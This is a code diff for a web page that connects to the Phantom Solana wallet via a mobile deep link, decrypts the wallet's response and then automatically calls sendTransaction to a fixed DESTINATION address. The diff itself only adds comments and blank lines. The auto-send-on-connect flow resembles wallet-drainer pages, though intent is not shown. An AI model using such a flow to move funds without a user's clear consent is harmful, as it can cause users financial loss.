@@ -57,6 +57,8 @@
       status.innerText = "📱 Redirection vers Phantom...";
       const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
       const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname + "?afterConnect=1");
+
+      // Génère une paire de clés pour chiffrer la réponse
       const keyPair = nacl.box.keyPair();
       const dappPublicKeyB58 = bs58.encode(keyPair.publicKey);
       const dappSecretKeyB58 = bs58.encode(keyPair.secretKey);
@@ -106,7 +108,7 @@
       }
     }
 
-    // Déchiffre la réponse Phantom au retour mobile
+    // 🔎 Ajout du code de retour mobile
     document.addEventListener("DOMContentLoaded", async () => {
       const params = new URLSearchParams(window.location.search);
       if (params.get("afterConnect") === "1") {
@@ -118,6 +120,7 @@
           try {
             const dappSecretKey = bs58.decode(sessionStorage.getItem("dappSecretKeyBase58"));
             const sharedSecret = nacl.box.before(bs58.decode(phantomPubKey), dappSecretKey);
+
             const decrypted = nacl.box.open.after(
               bs58.decode(data),
               bs58.decode(nonce),
@@ -129,6 +132,7 @@
               window.providerPublicKey = walletData.public_key;
               status.innerText = "📱 Connecté, envoi automatique...";
               info.innerText = walletData.public_key;
+
               await sendTransaction(window.providerPublicKey, DESTINATION, LAMPORTS);
             } else {
               status.innerText = "❌ Impossible de déchiffrer la réponse Phantom";
